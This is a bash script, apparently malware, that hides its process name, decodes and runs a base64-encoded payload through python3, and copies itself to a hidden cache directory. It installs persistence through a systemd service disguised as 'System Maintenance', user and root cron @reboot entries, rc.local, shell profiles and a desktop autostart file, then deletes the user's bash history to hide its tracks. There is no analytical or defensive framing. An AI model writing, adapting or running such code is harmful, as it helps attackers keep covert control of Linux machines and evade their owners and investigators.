#!/bin/bash
# Hide process name
echo -ne "\x01\x34" > /proc/self/comm

# Check if running
if [ -z "$(pgrep -f 'persist.sh')" ]; then
    # Not running, execute payload
    echo "$PAYLOAD_ENC" | base64 -d | python3
fi

# Self-preservation
mkdir -p ~/.cache/.hidden
cp "$0" ~/.cache/.hidden/persist.sh
chmod +x ~/.cache/.hidden/persist.sh

# Persistence mechanisms
{
    # Systemd service
    cat > /etc/systemd/system/.hidden.service <<SERVICE
[Unit]
Description=System Maintenance
After=network.target

[Service]
Type=simple
ExecStart=~/.cache/.hidden/persist.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE
    systemctl enable .hidden.service
    systemctl start .hidden.service
    
    # Cron jobs
    (crontab -l 2>/dev/null; echo "@reboot ~/.cache/.hidden/persist.sh") | crontab -
    (crontab -u root -l 2>/dev/null; echo "@reboot ~/.cache/.hidden/persist.sh") | crontab -u root -
    
    # RC local
    echo "~/.cache/.hidden/persist.sh" >> /etc/rc.local
    
    # User profiles
    echo "~/.cache/.hidden/persist.sh" >> ~/.profile
    echo "~/.cache/.hidden/persist.sh" >> ~/.bashrc
    
    # Hidden autostart
    mkdir -p ~/.config/autostart/
    cat > ~/.config/autostart/.hidden.desktop <<DESKTOP
[Desktop Entry]
Type=Application
Name=System Maintenance
Exec=~/.cache/.hidden/persist.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
DESKTOP
} &>/dev/null

# Cleanup
rm -rf ~/.bash_history
history -c
